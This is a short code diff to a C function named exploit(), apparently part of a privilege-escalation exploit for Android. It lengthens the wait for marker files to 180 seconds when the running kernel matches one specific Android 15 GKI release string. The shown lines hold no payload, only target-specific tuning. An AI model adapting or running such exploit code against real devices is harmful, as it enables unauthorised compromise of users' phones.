@@ -575,7 +575,10 @@ static int exploit(void) {
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
-    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
+    struct utsname running_kernel;
+    int wait_limit = uname(&running_kernel) == 0 &&
+        !strcmp(running_kernel.release, "6.6.77-android15-8-g561b227c0e7d-abogki425270610-4k") ? 180000 : 10000;
+    for (int elapsed = 0; elapsed < wait_limit; elapsed += 10) {
         usleep(10000);
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
             if (!seen[j] && access(markers[j].path, F_OK) == 0) {
